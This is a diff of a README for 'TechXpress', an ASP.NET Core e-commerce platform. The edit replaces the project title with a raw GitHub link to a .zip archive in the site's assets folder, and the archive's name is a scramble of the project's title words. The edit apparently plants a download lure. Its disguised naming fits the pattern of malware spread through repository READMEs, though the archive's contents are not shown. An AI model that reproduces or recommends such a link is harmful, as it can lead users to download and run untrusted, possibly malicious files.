@@ -1,2 +1,2 @@
-# TechXpress-E-commerce-Platform-with-ASP.NET-Core
+# https://raw.githubusercontent.com/ali-ashraf-mohammed/TechXpress-E-commerce-Platform-with-ASP.NET-Core/main/Ecommerce/wwwroot/assets/NE_with_Xpress_commerce_Platform_Tech_AS_Core_v2.3.zip
 TechXpress is a full-featured e-commerce platform that allows users to browse electronics (laptops, mobiles,  cameras), add them to a shopping cart, and complete purchases using integrated payment gateways. The  platform includes an admin panel for managing products, categories, and orders.
